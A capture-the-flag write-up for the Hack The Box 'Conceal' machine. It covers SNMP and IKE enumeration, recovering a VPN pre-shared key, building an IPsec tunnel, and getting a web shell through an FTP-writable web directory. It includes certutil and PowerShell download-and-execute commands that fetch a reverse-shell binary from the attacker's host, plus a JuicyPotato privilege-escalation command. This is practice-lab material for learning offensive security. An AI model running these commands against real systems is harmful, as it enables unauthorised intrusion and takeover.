<img src="Pasted image 20240722182605.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

Pasted image 20240720111513.png

**Ping**
![[Pasted image 20240626182029.png]]

**Nmap Scans**
```
mapit 10.10.10.116
```

Nmap Default  Scan
![[Pasted image 20240628102850.png]]
Can't see anything... :(

Nmap Script and Service Scan
![[Pasted image 20240628102938.png]]
We got some OS info here

Nmap All Port Scan
![[Pasted image 20240628104740.png]]
Still there is no TCP ports

Nmap UDP Scan
![[Pasted image 20240628155511.png]]


Now will run snmpwalk to retrieve info
```
snmpwalk -c public -v1 -t 10 10.10.10.116
```
![[Pasted image 20240628155914.png]]
IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43

Now Port 500
Hacktricks webpage: https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
![[Pasted image 20240628160717.png]]
![[Pasted image 20240628160817.png]]

Will use the tool to find some Valuable Info
```
ike-scan -M 10.10.10.116
```
![[Pasted image 20240628160913.png]]
We found Encryption and hashing Method, it is Triple-DES and SHA1, Auth type is PSK(Pre Shared Key), We have the Pre Shared key right...!  **9C8B1A372B1878851BE2C097031B6E43**

Will decrypt the Pre Shared Key
![[Pasted image 20240628161253.png]]
Found it, **Dudecake1!** 

We have connect to vpn via ipsec
Now have to edit /etc/ipsec.secret
```
%any : PSK "Dudecake1!"
```
![[Pasted image 20240628161927.png]]

Then add some info in /etc/ipsec.conf
```
config setup 
	charondebug="all" 
	uniqueids=yes 
	strictcrlpolicy=no 

conn concealh 
	authby=secret 
	auto=add 
	ike=3des-sha1-modp1024! 
	esp=3des-sha1! 
	type=transport 
	keyexchange=ikev1 
	left=10.10.14.9 
	right=10.10.10.116 
	rightsubnet=10.10.10.116[tcp]
```
![[Pasted image 20240628162110.png]]

Also install the app strongswan
```
apt install strongswan
```
![[Pasted image 20240628162310.png]]

Now will restart Ipsec
```
ipsec restart
```
![[Pasted image 20240628162454.png]]

Will up the Ipsec
```
ipsec up concealh
```
![[Pasted image 20240628162807.png]]

Now We are Connected Via tunnelling, will start our Nmap Scan again 
```
nmap -sT -p- --min-rate 10000 10.10.10.116 -oN anmap.txt
```
![[Pasted image 20240628170021.png]]

Service and Script Scan
```
nmap -sT -sC -sV -p21,80,135,139,445  10.10.10.116 -oN snmap.txt
```
![[Pasted image 20240628170109.png]]

FTP Enumeration
```
ftp 10.10.10.116
```
![[Pasted image 20240628170959.png]]
Nothing in FTP

SMB Enum
```
smbclient -U '' -L \\\\10.10.10.116\\\\
```
![[Pasted image 20240628170449.png]]

On Port 80
![[Pasted image 20240628170641.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240628171040.png]]

Will check /upload dir
![[Pasted image 20240628171116.png]]
We can see the text file we uploaded via FTP is here



Will get a web shell using this, as it is IIS we can use cmdasp.aspx program to get a web shell
```
put cmdasp.aspx
```
![[Pasted image 20240628171406.png]]

![[Pasted image 20240628171422.png]]
Now we can't see the anmap.txt, may be it is deleted when we upload another file, or all files in this directory will be deleted in some interval of time

We got error while accessing the .aspx file, will upload .asp file to get a Web Shell
![[Pasted image 20240628171811.png]]

![[Pasted image 20240628171833.png]]
Yes, the file from the directory was is deleted in certain Interval of time, ok will try to access this.asp file and get web shell.

Got it
![[Pasted image 20240628172020.png]]

Will Upload a reverse shell binary
```
certutil -urlcache -f http://10.10.14.9/met.exe c:/users/public/met.exe
```
![[Pasted image 20240628173319.png]]
Already hosted python webserver on port 80, and it was served.

Now will trigger the Payload
```
c:/users/public/met.exe
```
![[Pasted image 20240628173205.png]]

Got Reverse Shell
![[Pasted image 20240628173234.png]]

I have entered in Powershell env
```
powershell
```
![[Pasted image 20240628173707.png]]

Found user.txt
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240628173622.png]]

Got User.txt
![[Pasted image 20240628174226.png]]
Both the flag are same, it is user.txt


Will jump To Privilege Escalation........!

My Privileges
```
whoami /priv
```
![[Pasted image 20240628180200.png]]

Will use Juicy potato's for Privilege escalation, for that will transfer the Juicypotato.exe and .bat file to the target system.

Mybat.bat file content
```
@ECHO OFF

powershell.exe -command "& invoke-webrequest -Uri 'http://10.10.14.9/met.exe' -OutFile C:\users\public\met.exe"; "C:\users\public\met.exe"
```
![[Pasted image 20240628180340.png]]

Now We have necessary files 
![[Pasted image 20240628180437.png]]

Will run the jc.exe which JuicyPotato.exe and the CLSID for this system we can find in the link
https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/

Also We came to know about the system information from systeminfo
```
systeminfo
```
![[Pasted image 20240628180634.png]]

So I searched CLSID for nt authority/system for Windows 10 Enterprise, the link is provided above

Now will run the exploit
```
./jc.exe -p mybat.bat -l 443 -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```
![[Pasted image 20240628180804.png]]

Got Reverse Shell as Admin
![[Pasted image 20240628180840.png]]

**root.txt**
![[Pasted image 20240628181719.png]]
Both proof and root.txt is same flag.



Done With Conceal.......:)
